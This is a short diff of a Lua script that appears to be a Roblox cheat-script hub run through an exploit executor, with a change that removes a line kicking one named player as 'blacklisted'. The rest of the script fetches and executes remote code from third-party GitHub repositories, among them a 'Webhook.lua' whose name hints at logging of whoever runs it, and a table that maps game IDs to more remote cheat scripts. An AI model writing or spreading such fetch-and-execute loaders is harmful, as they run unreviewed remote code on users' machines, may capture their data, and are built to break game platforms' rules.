@@ -7,7 +7,7 @@ setfpscap(10000)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/Webhook.lua"))()
 
-if game.Players.LocalPlayer.Name == "headslep" then game.Players.LocalPlayer:Kick("haha blud, you just got blacklisted by folix!!") end
+
 
 local gameLinks = {
     [1962086868] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/toh.lua",
